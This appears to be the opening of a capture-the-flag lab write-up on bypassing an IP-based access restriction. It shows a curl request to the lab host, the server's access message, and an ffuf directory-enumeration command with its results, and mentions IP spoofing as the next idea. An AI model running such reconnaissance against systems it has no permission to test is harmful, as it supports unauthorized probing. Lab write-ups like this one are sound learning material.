1. Introduction
This write-up documents my approach to solving the TechSolutions lab from HackerDNA.
The objective was to bypass the external access restriction and retrieve the hidden flag by identifying a weakness in the application’s IP validation mechanism.
Command used to capture this screen:
curl http://3.253.24.120/index.php
________________________________________
2. Initial Reconnaissance
When accessing the website, the application displayed:
Your IP: <my IP>
You are not connecting from company network (<company IP>).
Password is required of external access.
The message revealed an important clue:
•	The application trusts IP-based access control.
•	Internal company users have different privileges.
•	External users require authentication.
This suggested testing for possible IP spoofing vulnerabilities.
________________________________________
3. Directory Enumeration
I performed web directory enumeration using FFUF.
Command:
ffuf -u http://3.253.24.120/FUZZ \
-w /usr/share/dirb/wordlists/common.txt
Result:
index.php
.htaccess
.htpasswd
server-status
No interesting hidden files were discovered.

The attack surface was likely inside the login/IP validation logic.
